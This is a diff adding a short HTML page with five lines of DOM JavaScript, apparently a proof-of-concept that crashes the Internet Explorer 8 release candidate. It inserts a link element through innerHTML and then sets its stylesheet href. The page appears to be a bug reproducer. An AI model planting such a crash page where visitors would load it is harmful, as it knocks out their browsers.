@@ -1,0 +1,17 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>5 lines of DOM2 JavaScript crash IE8rc1</title>
+</head><body>
+<script type="text/javascript">//<![CDATA[
+//discovered by yoursunny.com
+//this is actually the 'core' of jQuery-IEcrash.htm
+var div=document.createElement('div');
+div.innerHTML='div<div><link rel="stylesheet" type="text/css"/></div>';
+div=div.lastChild;
+var link=div.childNodes[0];
+link.setAttribute('href','http://css.cn.msn.com/c/green14.css');
+//]]></script>
+</body></html> 
